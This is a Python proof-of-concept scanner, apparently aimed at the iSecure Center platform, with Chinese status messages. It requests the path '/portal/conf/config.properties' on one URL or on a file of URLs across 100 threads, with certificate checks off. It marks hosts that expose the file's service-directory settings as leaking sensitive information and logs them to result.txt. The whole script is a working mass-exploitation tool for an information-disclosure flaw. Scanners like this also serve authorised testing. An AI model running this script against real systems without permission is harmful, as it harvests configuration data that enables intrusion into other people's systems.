import requests,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
  ██████  ███▄ ▄███▓ ██▓ ██▓    ▓█████ 
▒██    ▒ ▓██▒▀█▀ ██▒▓██▒▓██▒    ▓█   ▀ 
░ ▓██▄   ▓██    ▓██░▒██▒▒██░    ▒███   
  ▒   ██▒▒██    ▒██ ░██░▒██░    ▒▓█  ▄ 
▒██████▒▒▒██▒   ░██▒░██░░██████▒░▒████▒
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▓  ░ ▒░▓  ░░░ ▒░ ░
░ ░▒  ░ ░░  ░      ░ ▒ ░░ ░ ▒  ░ ░ ░  ░
░  ░  ░  ░      ░    ▒ ░  ░ ░      ░   
      ░         ░    ░      ░  ░   ░           
"""
    print(test)

def poc(target):
    playload = '/portal/conf/config.properties'
    res = requests.get(url=target+playload,verify=False,timeout=5)
    try:
        if 'bic.serviceDirectory.ip' in res.text:
            print(f"[+]{target}存在敏感信息泄露")
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f"[+]{target}存在敏感信息泄露\n")
        elif res.status_code != 200:
            print(f"[?]{target}网站未响应，请手工测试")
        else:
            print(f"[-]{target}不存在敏感信息泄露")
    except Exception as e:
        print(e)
def main():
    banner()
    parse=argparse.ArgumentParser(description='iSecure Center_poc')
    parse.add_argument('-u','--url',dest='url',type=str,help='pleaes enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input file')
    args=parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()


if __name__ == '__main__':
    main()